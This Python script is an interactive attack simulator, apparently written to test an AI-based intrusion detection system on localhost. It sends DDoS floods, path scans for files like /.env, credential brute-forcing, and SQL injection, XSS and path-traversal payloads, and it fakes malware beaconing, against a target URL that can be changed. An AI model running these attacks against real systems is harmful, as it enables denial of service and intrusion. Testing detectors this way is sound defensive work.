"""
Real Attack Simulator - Run from separate terminal
Simulates actual attack traffic like a real attacker would
"""

import requests
import threading
import time
import random
import string
import sys
from datetime import datetime

class RealAttackSimulator:
    """Simulate real attacks from external terminal"""
    
    def __init__(self, target_url="http://127.0.0.1:5000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def generate_random_string(self, length=10):
        """Generate random string for payloads"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def attack_ddos_flood(self, duration=30, rate=25):
        """Real DDoS Flood Attack - Rapid requests to overwhelm server"""
        print(f"\n🚨 [ATTACK] Starting DDoS Flood Attack")
        print(f"   Target: {self.target_url}")
        print(f"   Duration: {duration}s, Rate: {rate} req/s")
        print(f"   This will send {duration * rate} requests to overwhelm the server\n")
        
        end_time = time.time() + duration
        request_count = 0
        
        while time.time() < end_time:
            try:
                # Send rapid requests to various endpoints
                endpoints = ['/api/status', '/dashboard', '/api/control', '/']
                for endpoint in endpoints:
                    if time.time() >= end_time:
                        break
                    self.session.get(f"{self.target_url}{endpoint}", timeout=0.5)
                    request_count += 1
                time.sleep(1.0 / rate)
            except Exception as e:
                pass
        
        print(f"✅ [ATTACK] DDoS Flood Complete: {request_count} requests sent")
        return request_count
    
    def attack_port_scan(self, duration=20):
        """Real Port Scan Attack - Rapidly scan multiple endpoints"""
        print(f"\n🚨 [ATTACK] Starting Port Scan / Reconnaissance Attack")
        print(f"   Target: {self.target_url}")
        print(f"   Duration: {duration}s")
        print(f"   Scanning endpoints to map the system...\n")
        
        # Common endpoints to scan
        endpoints = [
            '/', '/dashboard', '/login', '/register', '/profile',
            '/api/status', '/api/control', '/api/get-user-profile',
            '/api/network-ids/status', '/api/network-ids/statistics',
            '/api/version', '/api/system-info',
            '/admin', '/admin/login', '/admin/dashboard',
            '/config', '/settings', '/api/config',
            '/users', '/api/users', '/api/logs',
            '/camera', '/api/camera/start', '/api/camera/stop',
            '/video_feed', '/static/css/style.css',
            '/.env', '/config.json', '/.git/config',
            '/wp-admin', '/phpmyadmin', '/.htaccess',
            '/api/v1/users', '/api/v2/status', '/api/v3/config'
        ]
        
        end_time = time.time() + duration
        scan_count = 0
        
        while time.time() < end_time:
            for endpoint in endpoints:
                if time.time() >= end_time:
                    break
                try:
                    response = self.session.get(
                        f"{self.target_url}{endpoint}",
                        timeout=0.3,
                        allow_redirects=False
                    )
                    scan_count += 1
                    if response.status_code != 404:
                        print(f"   [FOUND] {endpoint} - Status: {response.status_code}")
                except:
                    pass
                time.sleep(0.1)
        
        print(f"✅ [ATTACK] Port Scan Complete: {scan_count} endpoints scanned")
        return scan_count
    
    def attack_brute_force(self, duration=30, attempts_per_sec=3):
        """Real Brute Force Attack - Multiple failed login attempts"""
        print(f"\n🚨 [ATTACK] Starting Brute Force Attack")
        print(f"   Target: {self.target_url}/login")
        print(f"   Duration: {duration}s, Rate: {attempts_per_sec} attempts/s")
        print(f"   Trying common passwords...\n")
        
        common_passwords = [
            'admin', 'password', '123456', 'root', 'test', 'guest',
            'user', 'pass', '1234', 'admin123', 'password123',
            'qwerty', 'letmein', 'welcome', 'monkey', '1234567890'
        ]
        
        common_usernames = [
            'admin', 'root', 'user', 'test', 'guest', 'administrator',
            'admin123', 'user1', 'test123', 'demo', 'default'
        ]
        
        end_time = time.time() + duration
        attempt_count = 0
        
        while time.time() < end_time:
            username = random.choice(common_usernames)
            password = random.choice(common_passwords)
            
            try:
                response = self.session.post(
                    f"{self.target_url}/login",
                    json={'username': username, 'password': password},
                    timeout=1
                )
                attempt_count += 1
                if attempt_count % 5 == 0:
                    print(f"   [ATTEMPT {attempt_count}] Trying {username}:{password}")
            except:
                pass
            
            time.sleep(1.0 / attempts_per_sec)
        
        print(f"✅ [ATTACK] Brute Force Complete: {attempt_count} login attempts made")
        return attempt_count
    
    def attack_web_exploit(self, duration=20):
        """Real Web Exploit Attack - SQL injection, XSS, path traversal"""
        print(f"\n🚨 [ATTACK] Starting Web Exploit Attack")
        print(f"   Target: {self.target_url}")
        print(f"   Duration: {duration}s")
        print(f"   Sending malicious payloads...\n")
        
        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1--",
            "1' OR '1'='1",
            "admin' OR '1'='1'--"
        ]
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]
        
        # Path traversal payloads
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]
        
        all_payloads = sql_payloads + xss_payloads + path_payloads
        end_time = time.time() + duration
        exploit_count = 0
        
        while time.time() < end_time:
            payload = random.choice(all_payloads)
            
            try:
                # Try in GET requests
                self.session.get(
                    f"{self.target_url}/api/status?q={payload}",
                    timeout=0.5
                )
                
                # Try in POST requests
                self.session.post(
                    f"{self.target_url}/api/control",
                    json={'action': 'start', 'data': payload},
                    timeout=0.5
                )
                
                # Try in login
                self.session.post(
                    f"{self.target_url}/login",
                    json={'username': payload, 'password': payload},
                    timeout=0.5
                )
                
                exploit_count += 3
                if exploit_count % 10 == 0:
                    print(f"   [EXPLOIT {exploit_count}] Payload: {payload[:30]}...")
            except:
                pass
            
            time.sleep(0.3)
        
        print(f"✅ [ATTACK] Web Exploit Complete: {exploit_count} exploit attempts")
        return exploit_count
    
    def attack_malware_traffic(self, duration=40):
        """Real Malware Traffic - Beaconing, data exfiltration, C2 communication"""
        print(f"\n🚨 [ATTACK] Starting Malware Traffic Simulation")
        print(f"   Target: {self.target_url}")
        print(f"   Duration: {duration}s")
        print(f"   Simulating malware beaconing and C2 communication...\n")
        
        end_time = time.time() + duration
        request_count = 0
        
        while time.time() < end_time:
            try:
                # Malware beaconing (periodic check-ins)
                beacon_data = {
                    'id': self.generate_random_string(16),
                    'status': 'active',
                    'timestamp': time.time()
                }
                self.session.post(
                    f"{self.target_url}/api/status",
                    json=beacon_data,
                    timeout=1
                )
                request_count += 1
                
                # Data exfiltration (large POST requests)
                large_payload = self.generate_random_string(10000)
                self.session.post(
                    f"{self.target_url}/api/control",
                    json={'action': 'start', 'data': large_payload},
                    timeout=1
                )
                request_count += 1
                
                # Command and control (C2) communication
                c2_command = self.generate_random_string(50)
                self.session.get(
                    f"{self.target_url}/api/status?cmd={c2_command}",
                    timeout=1
                )
                request_count += 1
                
                # Wait before next cycle (malware doesn't flood continuously)
                time.sleep(random.uniform(2, 5))
            except:
                pass
        
        print(f"✅ [ATTACK] Malware Traffic Complete: {request_count} requests sent")
        return request_count
    
    def attack_iot_botnet(self, duration=60, num_bots=10):
        """Real IoT Botnet Attack - Multiple devices coordinated attack"""
        print(f"\n🚨 [ATTACK] Starting IoT Botnet Attack")
        print(f"   Target: {self.target_url}")
        print(f"   Duration: {duration}s, Bots: {num_bots}")
        print(f"   Simulating {num_bots} compromised IoT devices...\n")
        
        def bot_device(device_id):
            """Simulate a single bot device"""
            bot_session = requests.Session()
            bot_session.headers.update({
                'User-Agent': f'IoT-Device-{device_id}/1.0'
            })
            
            end_time = time.time() + duration
            request_count = 0
            
            while time.time() < end_time:
                try:
                    # Bot devices make periodic requests
                    bot_session.get(f"{self.target_url}/api/status", timeout=1)
                    request_count += 1
                    
                    # Random intervals (bots don't sync perfectly)
                    time.sleep(random.uniform(1, 3))
                except:
                    pass
            
            print(f"   [BOT {device_id}] Completed: {request_count} requests")
            return request_count
        
        # Start multiple bot devices
        threads = []
        total_requests = 0
        
        for i in range(num_bots):
            thread = threading.Thread(target=bot_device, args=(i,), daemon=True)
            thread.start()
            threads.append(thread)
        
        # Wait for all bots to complete
        for thread in threads:
            thread.join()
        
        print(f"✅ [ATTACK] IoT Botnet Complete: {num_bots} devices participated")
        return total_requests
    
    def attack_video_injection(self, duration=20):
        """Real Video Injection Attack - Manipulate video feed"""
        print(f"\n🚨 [ATTACK] Starting Video Injection Attack")
        print(f"   Target: {self.target_url}")
        print(f"   Duration: {duration}s")
        print(f"   Attempting to inject fake video feed...\n")
        
        try:
            # Enable video injection via API
            response = self.session.post(
                f"{self.target_url}/api/control",
                json={'action': 'toggle_inject'},
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"   [INJECT] Video injection enabled")
                print(f"   System should detect frame freeze/injection patterns")
                time.sleep(duration)
                
                # Disable after duration
                self.session.post(
                    f"{self.target_url}/api/control",
                    json={'action': 'toggle_inject'},
                    timeout=5
                )
                print(f"✅ [ATTACK] Video Injection Complete")
            else:
                print(f"⚠️ Failed to enable video injection: HTTP {response.status_code}")
        except Exception as e:
            print(f"❌ Error: {e}")
    
    def attack_unauthorized_access(self, duration=30):
        """Real Unauthorized Access - Try to access protected resources"""
        print(f"\n🚨 [ATTACK] Starting Unauthorized Access Attack")
        print(f"   Target: {self.target_url}")
        print(f"   Duration: {duration}s")
        print(f"   Attempting to access protected endpoints without authentication...\n")
        
        protected_endpoints = [
            '/api/get-user-profile',
            '/api/control',
            '/api/clear_logs',
            '/profile',
            '/dashboard',
            '/api/network-ids/train',
            '/api/network-ids/load-model'
        ]
        
        end_time = time.time() + duration
        attempt_count = 0
        
        while time.time() < end_time:
            for endpoint in protected_endpoints:
                if time.time() >= end_time:
                    break
                try:
                    response = self.session.get(
                        f"{self.target_url}{endpoint}",
                        timeout=1,
                        allow_redirects=False
                    )
                    attempt_count += 1
                    if response.status_code in [200, 302]:
                        print(f"   [ACCESS] {endpoint} - Status: {response.status_code} (Possible vulnerability!)")
                    elif response.status_code == 401:
                        print(f"   [BLOCKED] {endpoint} - Unauthorized (Good!)")
                except:
                    pass
                time.sleep(0.5)
        
        print(f"✅ [ATTACK] Unauthorized Access Complete: {attempt_count} attempts")
        return attempt_count


def get_user_input(prompt, input_type=str, default=None, min_val=None, max_val=None):
    """Get user input with validation"""
    while True:
        try:
            if default:
                user_input = input(f"{prompt} (default: {default}): ").strip()
                if not user_input:
                    return default
            else:
                user_input = input(f"{prompt}: ").strip()
                if not user_input:
                    print("   ⚠️  Input required!")
                    continue
            
            if input_type == int:
                value = int(user_input)
                if min_val is not None and value < min_val:
                    print(f"   ⚠️  Value must be >= {min_val}")
                    continue
                if max_val is not None and value > max_val:
                    print(f"   ⚠️  Value must be <= {max_val}")
                    continue
                return value
            elif input_type == str:
                return user_input
            else:
                return input_type(user_input)
        except ValueError:
            print("   ⚠️  Invalid input! Please try again.")
        except KeyboardInterrupt:
            print("\n\n⚠️  Cancelled by user")
            sys.exit(0)


def show_menu():
    """Display attack menu"""
    print("\n" + "=" * 70)
    print("🚨 REAL ATTACK SIMULATOR - Interactive Menu")
    print("=" * 70)
    print("\n📡 MAJOR ATTACK TYPES:")
    print("   1. DDoS Flood Attack")
    print("   2. Port Scan / Reconnaissance")
    print("   3. Brute Force Attack")
    print("   4. Video Injection Attack")
    print("\n⚙️  OPTIONS:")
    print("   5. Change Target URL")
    print("   0. Exit")
    print("=" * 70)


def main():
    # Default configuration
    target_url = "http://127.0.0.1:5000"
    simulator = RealAttackSimulator(target_url=target_url)
    
    print("\n" + "=" * 70)
    print("🚨 REAL ATTACK SIMULATOR - Interactive Menu")
    print("=" * 70)
    print("\n⚠️  WARNING: This simulates real attack traffic!")
    print("   Your AI-IDS should detect and log these attacks.")
    print("   Watch the dashboard logs to see detection in real-time.")
    print(f"\n🎯 Current Target: {target_url}")
    
    while True:
        try:
            show_menu()
            choice = input("\n👉 Select attack (0-5): ").strip()
            
            if choice == '0':
                print("\n👋 Exiting attack simulator. Goodbye!\n")
                break
            
            elif choice == '1':  # DDoS Flood
                print("\n🚨 DDoS Flood Attack")
                duration = get_user_input("   Duration (seconds)", int, default=30, min_val=1, max_val=300)
                rate = get_user_input("   Request rate (req/s)", int, default=25, min_val=1, max_val=100)
                
                start_time = time.time()
                simulator.attack_ddos_flood(duration=duration, rate=rate)
                elapsed = time.time() - start_time
                print(f"\n✅ Attack completed in {elapsed:.1f} seconds")
                input("\n   Press Enter to continue...")
            
            elif choice == '2':  # Port Scan
                print("\n🚨 Port Scan Attack")
                duration = get_user_input("   Duration (seconds)", int, default=20, min_val=1, max_val=300)
                
                start_time = time.time()
                simulator.attack_port_scan(duration=duration)
                elapsed = time.time() - start_time
                print(f"\n✅ Attack completed in {elapsed:.1f} seconds")
                input("\n   Press Enter to continue...")
            
            elif choice == '3':  # Brute Force
                print("\n🚨 Brute Force Attack")
                duration = get_user_input("   Duration (seconds)", int, default=30, min_val=1, max_val=300)
                rate = get_user_input("   Attempts per second", int, default=3, min_val=1, max_val=10)
                
                start_time = time.time()
                simulator.attack_brute_force(duration=duration, attempts_per_sec=rate)
                elapsed = time.time() - start_time
                print(f"\n✅ Attack completed in {elapsed:.1f} seconds")
                input("\n   Press Enter to continue...")
            
            elif choice == '4':  # Video Injection
                print("\n🚨 Video Injection Attack")
                duration = get_user_input("   Duration (seconds)", int, default=20, min_val=1, max_val=300)
                
                start_time = time.time()
                simulator.attack_video_injection(duration=duration)
                elapsed = time.time() - start_time
                print(f"\n✅ Attack completed in {elapsed:.1f} seconds")
                input("\n   Press Enter to continue...")
            
            elif choice == '5':  # Change Target
                print("\n⚙️  Change Target URL")
                new_target = get_user_input("   Target URL", str, default=target_url)
                if new_target:
                    target_url = new_target
                    simulator = RealAttackSimulator(target_url=target_url)
                    print(f"✅ Target updated to: {target_url}")
                    input("\n   Press Enter to continue...")
            
            else:
                print("\n⚠️  Invalid choice! Please select 0-5.")
                input("   Press Enter to continue...")
        
        except KeyboardInterrupt:
            print("\n\n⚠️  Interrupted by user. Exiting...\n")
            break
        except Exception as e:
            print(f"\n❌ Error: {e}")
            input("   Press Enter to continue...")


if __name__ == '__main__':
    main()

